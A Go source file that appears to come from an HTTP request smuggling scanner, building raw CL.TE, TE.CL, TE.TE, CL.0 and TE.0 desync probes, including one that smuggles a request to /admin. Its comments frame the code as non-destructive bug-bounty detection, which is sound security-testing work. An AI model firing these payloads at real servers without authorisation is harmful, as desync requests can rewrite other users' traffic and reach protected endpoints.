package payloads

import (
	"fmt"
	"net/url"

	"request_smuggling/core"
)

// SMUGGLING-PROBE SAFETY RULE (do not violate in any payload here):
//
// A detection probe must NEVER smuggle a COMPLETE standalone request (one with
// its own Host and a terminating blank line). A complete smuggled request on a
// vulnerable back-end causes Response Queue Poisoning: it injects an extra
// response into the connection's queue, so every subsequent real user on that
// pooled connection receives someone else's response — chaos, effectively a DoS
// on live traffic.
//
// Instead, end the smuggled prefix on a DANGLING header value (e.g. "X-Ignore: "
// with no CRLFCRLF). The next real request then glues onto that header value, so
// exactly ONE following request is rewritten and consumed — no leftover request
// is left in the queue, no poisoning. This keeps detection non-destructive on
// production bug-bounty targets.

func extractVariablesFromRecord(rec core.Record) (string, string, string) {
	u, _ := url.Parse(rec.Request.Endpoint)
	path := u.Path
	if path == "" {
		path = "/"
	}
	ua := rec.Request.UserAgent
	if ua == "" {
		ua = "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
	}
	return path, u.Host, ua
}

func BuildTECL(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 4\r\n"+
			"Transfer-Encoding: chunked\r\n\r\n"+
			"5e\r\n"+
			"POST /404 HTTP/1.1\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 15\r\n\r\n"+
			"x=1\r\n0\r\n\r\n",
		path, host, ua,
	)
	return []byte(payload)
}
func BuildTimeTECL(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 6\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"\r\n"+
			"0\r\n"+
			"\r\n"+
			"G",
		path, host, ua,
	)
	return []byte(payload)
}
func BuildCLTE(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 44\r\n"+
			"Content-type: application/x-www-form-urlencoded; charset=UTF-8\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"\r\n0\r\n\r\n"+
			"GET /hopefully404 HTTP/1.1\r\n"+
			"X-Ignore: x",
		path, host, ua,
	)
	return []byte(payload)
}

func BuildTimeCLTE(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 4\r\n"+
			"Content-type: application/x-www-form-urlencoded; charset=UTF-8\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"\r\n"+
			"1\r\n"+
			"G\r\n"+
			"0\r\n"+
			"\r\n",
		path, host, ua,
	)
	return []byte(payload)
}

func BuildTETE(rec core.Record, obfuscatedHeader string) ([]byte, []byte) {
	path, host, ua := extractVariablesFromRecord(rec)
	payload2 := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Lenght: 3\r\n"+
			"Transfer-Encoding: invalid\r\n"+
			"%s\r\n"+
			"\r\n"+
			"1\r\nG\r\n0\r\n\r\n",
		path, host, ua, obfuscatedHeader,
	)
	payload1 := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 3\r\n"+
			"%s\r\n"+
			"Transfer-Encoding: invalid\r\n"+
			"\r\n"+
			"1\r\nG\r\n0\r\n\r\n",
		path, host, ua, obfuscatedHeader,
	)
	return []byte(payload1), []byte(payload2)
}

func BuildZeroCLProbe(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 10\r\n"+
			"Content-type: application/x-www-form-urlencoded; charset=UTF-8\r\n"+
			"\r\n"+
			"x=1",
		path, host, ua,
	)
	return []byte(payload)
}

func BuildZeroCLHeadAndBody(rec core.Record, timebased bool) ([]byte, []byte) {
	path, host, ua := extractVariablesFromRecord(rec)

	body := fmt.Sprintf(
		"GET /admin HTTP/1.1\r\n" +
			"X-Ignore: dummy",
	)

	cl := 0
	if timebased {
		cl = len(body)
	}

	headers := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n",
		path, host, ua, cl,
	)
	return []byte(headers), []byte(body)
}

// BuildCLZero builds the CL.0 poison request: a POST whose body is a complete,
// self-contained smuggled request to /<marker>. The front-end honors
// Content-Length and forwards the whole thing; a back-end that ignores CL
// treats the body as the next request on the connection, so the smuggled GET
// surfaces as its own response.
func BuildCLZero(rec core.Record, marker string) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	body := fmt.Sprintf(
		"GET /%s HTTP/1.1\r\n"+
			"X-Ignore: foo",
		marker,
	)
	return []byte(fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s",
		path, host, ua, len(body), body,
	))
}

// BuildNormalGet builds a plain keep-alive GET to the record's own path, used
// as the trailing request in a pipelined desync probe.
func BuildNormalGet(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	return []byte(fmt.Sprintf(
		"GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n",
		path, host, ua,
	))
}

// BuildTEZero builds the TE.0 poison request. The front-end honors
// Transfer-Encoding: chunked; a back-end that ignores TE treats the body as
// empty and parses the chunk payload as the next request. OPTIONS is used
// because front-ends that reject bodies on GET/POST let it through (this is the
// method that made the Google Cloud LB TE.0 fire). No Content-Length is sent.
// The smuggled prefix ends on a dangling X-Ignore header per the safety rule
// above, so only the following request is rewritten — no queue poisoning.
func BuildTEZero(rec core.Record, marker string) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	smuggled := fmt.Sprintf("GET /%s HTTP/1.1\r\nX-Ignore: foo", marker)
	chunk := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(smuggled), smuggled)
	return []byte(fmt.Sprintf(
		"OPTIONS %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s",
		path, host, ua, chunk,
	))
}
